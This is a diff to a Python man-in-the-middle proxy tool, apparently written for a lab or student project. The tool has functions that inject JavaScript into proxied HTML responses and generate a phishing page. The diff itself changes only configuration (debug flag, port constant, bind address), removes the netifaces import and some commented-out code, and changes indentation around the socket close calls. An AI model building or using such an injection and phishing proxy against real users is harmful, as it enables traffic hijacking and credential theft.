@@ -4,7 +4,6 @@ import socket
 import threading
 import re
 from urllib.parse import unquote
-import netifaces
 
 '''
 NOTE
@@ -17,9 +16,9 @@ lsof -i :8080 # Get the PID of the process running on port 8080
 kill -9 <PID> # Kill the process
 '''
 
-DEBUG = False
+DEBUG = True
 PROXY_IP = "127.0.0.1"
-PROXY_INTERFACE = "0.0.0.0"
+PROXY_PORT = 8080
 
 def generate_phishing_page():
     if DEBUG:
@@ -109,7 +108,7 @@ def inject_javascript(response_data):
     """
     response_data = modify_content_length_header(response_data, len(js_code))
     js_code = js_code.replace("{proxy_ip}", PROXY_IP)
-    js_code = js_code.replace("{proxy_port}", str(8080))
+    js_code = js_code.replace("{proxy_port}", str(PROXY_PORT))
 
     # Find the position of the </body> tag
     body_end_index = response_data.lower().find("</body>")
@@ -200,17 +199,16 @@ def handle_active_client(client_socket):
             print("Response is:\n{}".format(response))
     else:
         print("No response received from the server.")
-
-    client_socket.close()
-    server_socket.close()
-    print("Client connection closed.")
+        client_socket.close()
+        server_socket.close()
+        print("Client connection closed.")
 
 
 def proxy_active(listening_ip, listening_port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((PROXY_INTERFACE, int(listening_port)))
+    server.bind((listening_ip, int(listening_port)))
     server.listen(5)
-    print("Proxy server listening on {}:{}".format(PROXY_INTERFACE, listening_port))
+    print("Proxy server listening on {}:{}".format(listening_ip, listening_port))
 
     while True:
         client_socket, client_address = server.accept()
@@ -246,11 +244,6 @@ def main():
     if args.listening_port is None:
         print("No listening port provided. Exiting...")
         exit(1)
-
-    #gateways = netifaces.gateways()
-    #interface = gateways['default'][netifaces.AF_INET][1]
-    #global PROXY_IP
-    #PROXY_IP = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']    
 
     if args.mode == "active":
         proxy_active(args.listening_ip, args.listening_port)
